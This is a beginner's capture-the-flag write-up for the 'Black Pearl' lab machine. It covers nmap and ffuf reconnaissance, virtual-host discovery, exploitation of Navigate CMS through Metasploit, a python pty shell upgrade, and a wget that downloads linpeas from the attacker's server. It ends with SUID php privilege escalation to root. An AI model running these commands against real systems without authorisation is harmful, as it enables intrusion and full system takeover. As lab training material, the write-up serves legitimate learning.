![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/3ef60e123a994aca15abbd23609ae5d51f78fd42/Blackpearl/images/logo.png)
# Black Pearl
 
 
 This is the second box i tried i skipped the box's in between  and did  this one because i wanted to test my skills alone.

 **Well it didn't go well** 😑



- You can find this Box in [**here**](https://drive.google.com/drive/folders/1VXEuyySgzsSo-MYmyCareTnJ5rAeVKeH) or you can find in the resources on the youtube video description

*This is a linux machine !*

You can find the IP address of the Blackpearl  Machine using **netdiscover**
```
netdiscover -r [Local IP]/24
```
what it means
```
netdiscover -r [Local IP]/24 is like throwing a neighborhood party invitation to all the devices in your IP block!

The -r tells netdiscover to roam around the network, asking, "Hey, who's here?" within the /24 range (which means the whole street!). It’s basically you being the nosy neighbor, but for IP addresses! 🎉


```
## Scanning
Let's start with **nmap**

```
$ nmap -p- -A -T4 -O -v 192.***.*.**


-p-: Scans all 65,535 ports.
-A: Enables advanced scanning (detects OS, service versions, runs scripts, etc.).
-T4: Uses a faster scan timing.
-O: Specifically detects the operating system.
-v: Enables verbose mode, providing detailed output.

```
Result :

```

Discovered open port 80/tcp on 
Discovered open port 53/tcp on 
Discovered open port 22/tcp on 
SYN Stealth Scan Timing: About 44.54% done; ETC: 05:26 (0:00:39 remaining)
Completed SYN Stealth Scan at 05:26, 68.13s elapsed (65535 total ports)
Initiating Service scan at 05:26
Scanning 3 services on 
Completed Service scan at 05:26, 6.07s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 192.168.57.6
NSE: Script scanning 
Initiating NSE at 05:26
Completed NSE at 05:27, 8.38s elapsed
Initiating NSE at 05:27
Completed NSE at 05:27, 0.11s elapsed
Initiating NSE at 05:27
Completed NSE at 05:27, 0.01s elapsed
Nmap scan report for 192.***.**.*
Host is up (0.0059s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:07:A1:5C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Uptime guess: 23.142 days (since Sat Jul 20 02:02:24 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   5.88 ms 192.***.**.*

NSE: Script Post-scanning.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.52 seconds
           Raw packets sent: 65607 (2.888MB) | Rcvd: 65550 (2.623MB)

```

Now let's do a quick scan to identify the versions

```
$ nmap -sV -T4 [Target Ip] 


-sV: Detects the versions of services running on open ports.
-T4: Sets a faster scan speed.
```
Results :

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 05:36 UTC
Nmap scan report for 192.***.***.***
Host is up (0.00080s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
80/tcp open  http    nginx 1.14.2
MAC Address: 08:00:27:07:A1:5C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds

```
We have found **Open ports** :

- 22/tcp open  **ssh**     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

- 53/tcp open  **domain**  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)

- 80/tcp open  **http**    nginx 1.14.2

Okay so we got ssh,DNS,http

Let's check the website 

```
http://[target ip]
```

We will see Nginx website there is nothing valuable on the website

But if we check the page source we will find a **user@domain**

```
<!-- Webmaster: alek@blackpearl.tcm -->
```
Okay we got some info now what can we do next ?

let's try to do **directory hunting** 

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://[Targetip]/FUZZ

ffuf (Fuzz Faster U Fool), a web fuzzing tool, to discover directories and files on a web server.

-w : path  to your wordlists

-u : The URL to be Fuzzed

```
## Result :

```
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ  -u http://[Target Ip]/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://[Target IP]/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 62ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 60ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 63ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 84ms]
# Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 84ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 84ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 86ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 87ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 88ms]
# on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 88ms]
secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 84ms]
                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 54ms]
:: Progress: [220560/220560] :: Job [1/1] :: 281 req/sec :: Duration: [0:08:22] :: Errors: 0 ::

```
- secret

Okay we found a file called **secret** which is downloadable and it say's 

```
OMG you got r00t !

Just kidding...search somewhere else. Directory Busting wont give anything.

<This message is here so that you don't waste more time directory busting this particular website.>


-Alek


```
Okay Alek !

Next We will perfrom **dnsrecon**



```
dnsrecon -r 127.0.0.0/25 -n [blackpearl ip] -d blah

dnsrecon is a DNS (Domain Name System) reconnaissance tool used to gather information about a domain's DNS records.

-r 127.0.0.0/25: Range of IP addresses to scan (subnet range).

-n [blackpearl ip]: Specify the nameserver IP to query.

-d blah: Domain name to target (here, "Type anything it will work")


```

 we got **"backpearl.tcm @ 127.0.0.1"**

 Now to connect to this website we have to add that to our dns > **/etc/hosts**

 ```
 nano /etc/hosts/
 
 ```
 Just under Your machines[Kali linux Ip]
 Add this line :

 ```
 [Target iP] blackpearl.tcm
 ```

restart your browser and try visiting this site

```
http://blackpearl.tcm

```
- php 7.3
let's fuzz this directory again

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ

```
## Result :

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ  -u http://blackpearl.tcm/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blackpearl.tcm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 86784, Words: 4212, Lines: 1040, Duration: 32ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 86783, Words: 4212, Lines: 1040, Duration: 32ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 126ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 64ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 79ms]
# Copyright 2007 James Fisher [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 170ms]
#                       [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 262ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 275ms]
#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 324ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 290ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 328ms]
# on atleast 2 different hosts [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 328ms]
#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 407ms]
                        [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 411ms]
navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 131ms]
                        [Status: 200, Size: 86817, Words: 4212, Lines: 1040, Duration: 284ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```
As Heath said **"Navigate to navigate"**

We will see a **Navigate Login** website


```
/navigate/login.php

Navigate CMS is a content management system designed to help users create, manage, and update digital content on websites without needing advanced technical knowledge.
```

Well you can try to bruteforce the login page using known user names like alek,blackpearl something .

Now while searching in Google, searchploit & Rapid7 we found 

**Navigate CMS -(Unauthenticated) Remote Code Execution**

We will search for it in **Metasploit**

Start Metasploit :

```
msfconsole
```
Search navigate CMS:

```
msf5 > search navigate
```
You will find 

```
exploit/multi/http/ navigate_cms_rce
```
Okay now you can use & set the rhosts,vhost 

```
| msf5 > use exploit/multi/http/ navigate_cms_rce

| msf5 exploit(multi/http/navigate_cms_rce) > options

| msf5 exploit(multi/http/navigate_cms_rce) > set rhosts [black pearl ip]

| msf5 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm


| msf5 exploit(multi/http/navigate_cms_rce) > run
```
We have a meterpreter session running ! Good

```
meterpreter > shell 

whoami
www-data
```

Okay now we are in  but we are just on the **www-data** and we have to do **privilege escalation** 

Now we need to get a shell but how ?

You can check if they have python installed if thet have then we can generate a tty shell using a one liner code found online

check by typing :

```
which python

[It will return the python version if they have installed it]
```

Type this code to generate the tty shell to know more about it click [**here**](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)


```
python -c 'import pty; pty.spawn("/bin/bash")' 


This command is like telling Python to open a secret doorway (pty.spawn) into the /bin/sh shell. It's a quick way to upgrade a basic shell into something more interactive and user-friendly, like going from a tricycle to a sports car—still a ride, but way more fun!
```

Okay Now we got a shell back 

Open a new **Terminal** in Kali Linux 

we can use the script called **linpeas**.

```
linpeas.sh is a script used in cybersecurity to find potential vulnerabilities and misconfigurations on Linux systems. It's like a detective that quickly scans the system, looking for clues that could help an attacker gain more control or information.

This is for doing linux privilege escalation and if you were to go for windows privilege escalation you can search for winPeas 
```

We can try to send the **linpeas.sh**
First git clone the **"linpeas.sh"** script or  (Find the latest version) from [**here**]https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1 Download it manually :)

After downloading move the linpeas.sh file to your folder where you want to host it 

You can host up a webserver from your attacker machine using **python3**
(Check if **linpeas.sh** is present in your folder or not)
```
python3 -m http.server 80 
```
Okay now you have setup the server

Now go back to the tty shell download the file using **wget** 
## Usage
```
wget [http://URL/location]  [filename wou want to save as]

```
Like this
```
wget http://[your ip]/linpeas.sh linpeas.sh

```
Give **linpeas.sh** execution permission

```
chmod +x linpeas.sh
```

Run the scirpt

```
./linpeas.sh
```
Now it's going to give you a lot of information about that system

Scroll down to see **intresting files**

We find **/usr/bin/php7.3 (Unknown SUID Binary)**



You can use this command to find special files with setuid permissions by also ignoring errors.

```
find / -type f -perm -4000 2>/dev/null

find /: Search starting from the root directory (/).
-type f: Look only for regular files.
-perm -4000: Find files with the setuid bit set (special permission that lets users run the file with the permissions of the file owner).
2>/dev/null: Redirect any error messages (like "Permission denied") to nowhere, so they don’t clutter the output.
```
it will also show **/usr/bin/php7.3**

## Getting root !

Now Check for **SUID** in **GTFOBins** and try to find anything realted to the one's we found using the above command 

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/e533e2df7d4cc0ba9152e971ddaafd7f1534e672/Blackpearl/images/Screenshot%202024-08-15%20144301.png)

we found **php**

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/e533e2df7d4cc0ba9152e971ddaafd7f1534e672/Blackpearl/images/Screenshot%202024-08-15%20144329.png)

Click & Scroll down to the **SUID** section

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/e533e2df7d4cc0ba9152e971ddaafd7f1534e672/Blackpearl/images/Screenshot%202024-08-15%20144445.png)

Copy the line of code you see don't execute !
```
./php -r "pcntl_exec('/bin/sh', ['-p']);"

./php -r: Runs a PHP script directly from the command line.

"pcntl_exec('/bin/sh', ['-p']);": Uses the pcntl_exec function to execute /bin/sh (a shell) with the -p flag, which may keep privileges.

This is a one liner code to generate a shell

``` 

Now you can use this by going to the location where you found the php7.3
which is :
```
/usr/bin/php7.3 
```
```
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```
And that's it
```
# id 
uid =33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

```
we are **root!**
```
# cd /root

# cat flag.txt

Good job on this one
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach Virtual Host Routing which is used in a lot of CTF

```
Done ! 


```
2 Down 3 to go
```
